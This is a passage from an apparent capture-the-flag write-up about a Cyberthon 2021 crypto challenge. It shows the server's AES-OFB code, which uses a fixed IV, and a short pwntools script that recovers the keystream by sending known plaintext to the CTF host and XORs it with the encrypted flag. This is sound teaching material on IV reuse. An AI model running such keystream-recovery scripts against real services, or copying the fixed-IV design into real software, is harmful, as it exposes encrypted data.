style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span>To ensure that all APOCALYPSE agents are encrypting their files properly, </span></span>
<span class="line"><span>APOCALYPSE has decided to provide a centralized encryption </span></span>
<span class="line"><span>service for all their members. We&#39;ve recently recovered a flag that was encrypted by their service. </span></span>
<span class="line"><span>Can you try to recover the flag?</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="reconnaissance-1" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance-1" aria-label="Permalink to â€œReconnaissanceâ€">â€‹</a></h3><p>We are greeted with:</p><ul><li>An encrypted flag</li><li>Whatever APOCALYPSE is running on their server:</li></ul><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;">#! /usr/bin/python3</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> Crypto.Hash </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> MD5</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> Crypto.Cipher </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> AES</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> binascii </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> unhexlify</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> sys</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">KEY</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">/home/encraptor1/aeskey</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">rb</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">).read()</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">IV</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">/home/encraptor1/iv</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">rb</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">).read()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#50FA7B;"> read</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">prompt</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">):</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(prompt)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    data </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> sys.stdin.buffer.read()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> data</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#50FA7B;"> write</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">prompt</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">):</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    try</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">        sys.stdout.buffer.write(prompt)</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    except</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#8BE9FD;--shiki-dark-font-style:italic;"> TypeError</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">        sys.stdout.buffer.write(prompt.encode(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">utf-8</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">))</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    sys.stdout.flush()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#50FA7B;"> md5sum</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">data</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">):</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    md5 </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> MD5</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">.new()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    md5.update(data)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> md5.hexdigest()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#50FA7B;"> encrypt</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">data</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">key</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#24292E;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">iv</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">):</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    cipher </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> AES</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">.new(key, </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">AES</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">MODE_OFB</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">iv</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">iv)</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> unhexlify(md5sum(data)) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> cipher.encrypt(data)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#50FA7B;"> banner</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">():</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">  ______        _____                 _               __   ___  </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;"> |  ____|      / ____|               | |             /_ | / _ </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\\</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;"> \n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;"> | |__   _ __ | |     _ __ __ _ _ __ | |_ ___  _ __   | || | | |</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;"> |  __| | &#39;_ </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">| |    | &#39;__/ _` | &#39;_ </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">| __/ _ </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">| &#39;__|  | || | | |</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;"> | |____| | | | |____| | | (_| | |_) | || (_) | |     | || |_| |</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;"> |______|_| |_|</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">_____|_|  </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">__,_| .__/ </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">__</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\\</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">___/|_|     |_(_)___/ </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">                               | |                              </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">                               |_|                              </span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-light-text-decoration:inherit;--shiki-dark:#F8F8F2;--shiki-dark-font-style:italic;--shiki-dark-text-decoration:underline;">;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># To be fair </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">banner()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">data </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> read(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">[+] Data: </span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">[+] Encrypted:</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">----------------------------- START -------------------------------</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">write(encrypt(data, </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">KEY</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">IV</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">))</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">write(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">------------------------------ END --------------------------------</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br></div></div><p>Ostensibly this uses the AES block cipher with <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)" target="_blank" rel="noreferrer">Output-Feedback</a> mode (OFB).</p><p>A diagram of how the encryption happens at a high level is attached by shamelessly ripping off Wikipedia: <img src="/assets/Images/Cyberthon-2021/AES-OFB.png" alt=""></p><p>This is a lot more straightforward compared to Welp2.0:</p><p>We simply need to notice that the <code>IV</code> (initialization vector) which <strong>SHOULD</strong> be randomized is instead set to some <code>constant value</code>. <strong>THAT&#39;S BAD</strong>.</p><h3 id="wait-why" tabindex="-1">Wait why <a class="header-anchor" href="#wait-why" aria-label="Permalink to â€œWait whyâ€">â€‹</a></h3><p>Notice on the diagram that the <code>encryption</code> and <code>decryption</code> protocols are largely similar, except that the positions of the <code>ciphertext</code> and <code>plaintext</code> are swapped.</p><p>Theoretically you <code>COULD</code> just feed the <code>ciphertext</code> into the service, but for whatever reason that didn&#39;t go so well for me.</p><p>Instead, I believe my solution is more intuitive:</p><ol><li>Send a <code>dummy string</code> of really long length.</li><li><code>XOR</code> the ciphertext given to you by the service with your <code>dummy string</code> to retrieve your <code>XOR</code> <strong>key</strong>.</li><li><code>XOR</code> the key with your flag ciphertext to retrieve flag!</li></ol><h3 id="the-flag" tabindex="-1">The flag <a class="header-anchor" href="#the-flag" aria-label="Permalink to â€œThe flagâ€">â€‹</a></h3><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># IV reuse in OFB mode</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># No better than XOR cipher.</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> pwn </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">remote(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">20101</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.send(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">A</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">64</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.shutdown()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">----------------------------- START -------------------------------</span><span style="--shiki-light:#005CC5;--shiki-dark:#FF79C6;">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">enc</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.recvuntil(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">------------------------------ END --------------------------------</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)[:</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">68</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">]</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(enc)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">key</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">xor(enc[</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">16</span><span style="--shiki-light:#24292E;--shiki-dark:#FF79C6;">:</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">],</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">A</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">64</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;KEY FOUND: </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">key</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r.close()</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Now that we recovered the iv, we simply go and decrypt anything we like...</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">with</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">flag.txt.encrypted</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">rb</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">as</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> f:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    flag</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">f.read()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">msg</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">xor(flag[</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">16</span><span style="--shiki-light:#24292E;--shiki-dark:#FF79C6;">:</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">],key)</span></span>
